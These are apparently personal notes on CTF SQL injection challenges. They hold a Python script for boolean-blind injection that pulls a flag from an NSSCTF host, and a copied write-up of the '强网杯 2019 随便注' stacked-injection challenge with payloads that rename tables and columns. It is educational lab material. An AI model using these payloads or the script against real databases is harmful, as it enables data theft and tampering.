![[Pasted image 20231204143319.png]]


### bool盲注
```python
import requests
 
asc_str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
burp0_url = "http://node1.anna.nssctf.cn:28300/"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                 "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                 "Accept-Encoding": "gzip, deflate",
                 "Content-Type": "application/x-www-form-urlencoded"
                 }
content = ''
 
for pos in range(1, 100):
    min_num = 32
    max_num = 126
    mid_num = (min_num + max_num) // 2
    while(min_num < max_num):
        # payload = "tarnish'/**/!=!/**/(ascii(mid((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),{},1))>{})/**/!=!/**/'1".format(pos, mid_num)
        # payload = "tarnish'/**/!=!/**/(ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='test'),{},1))>{})/**/!=!/**/'1".format(pos, mid_num)
        # payload = "tarnish'/**/!=!/**/(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),{},1))>{})/**/!=!/**/'1".format(pos, mid_num)
        payload = "tarnish'/**/!=!/**/(ascii(mid((select/**/group_concat(flag)/**/from/**/test.flag),{},1))>{})/**/!=!/**/'1".format(pos, mid_num)
        burp0_data = {"username": payload}#tarnish是题目给的要求
        resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        if 'string(39)' in resp.text:
            min_num = mid_num + 1
        else:
            max_num = mid_num
        mid_num = (min_num + max_num) // 2
    content += chr(min_num)
    print(content)
```

## 堆叠注入：
[强网杯 2019]随便注 mmkjhhsd的WriteUp

 2023-11-28 19:31 By  ![](

mmkjhhsd


### 前置知识

### alter

修改表名 `alter table 表名 rename 新表名;`

修改字段名 `alter table 表名 change 旧字段名 新字段名 类型;`

## 注入过程

首先我们通过使用`1'` 发现报错说明是字符型单引号

根据题目标签提示有堆叠注入  
我们使用`1';show+tables;#`获取到所有的表  
![NSSIMAGE](https://www.nssctf.cn/files/2023/3/8/38d2e10bec.jpg)  
![NSSIMAGE](https://www.nssctf.cn/files/2023/3/8/77a033f4fc.jpg)

然后使用`show columns from 表名;`获取到表中的字段名  
![NSSIMAGE](https://www.nssctf.cn/files/2023/3/8/9c6e585746.jpg)  
![NSSIMAGE](https://www.nssctf.cn/files/2023/3/8/0c1f11337c.jpg)  
![NSSIMAGE](https://www.nssctf.cn/files/2023/3/8/8a66743ddf.jpg)  
![NSSIMAGE](https://www.nssctf.cn/files/2023/3/8/8916e2657f.jpg)

通过观察 words表单有两列, 也就是上面的 1 和 hahahah  
我们可以推测 这个表单其实是从words表中以`id`字段为索引获取到内容 然后返回到前台  
并且后台的查询语句为`"select * from words where id='".$_GET['inject']."'"`

那么 我们是不是可以通过修改带flag字段的表的名字为words表 然后把flag 字段修改为id  
通过三条alter语句来修改

- 修改words表名为其他的
    - `alter table words rename words1;`
- 修改1919810931114514表名为words
    - alter table `1919810931114514` rename words;
- 修改新的words表中的flag列名为id
    - alter table words change flag id varchar(60);  
        得到最终payload `1';alter table words rename words1;alter table` 1919810931114514 `rename words;alter table words change flag id varchar(60);#`

提交payload  
![NSSIMAGE](https://www.nssctf.cn/files/2023/3/8/52f8679f9b.jpg)  
然后刷新页面  
![NSSIMAGE](https://www.nssctf.cn/files/2023/3/8/7bb57a27f0.jpg)  
发现没结果了, 原因是新的id列中的值已经变为flag值了 所以查询inject=1查不到  
我们可以通过让where条件永远为正查出来所有数据  
构造payload`1' or '1'='1`  
获取到flag值  
![NSSIMAGE](https://www.nssctf.cn/files/2023/3/8/856243ae01.jpg)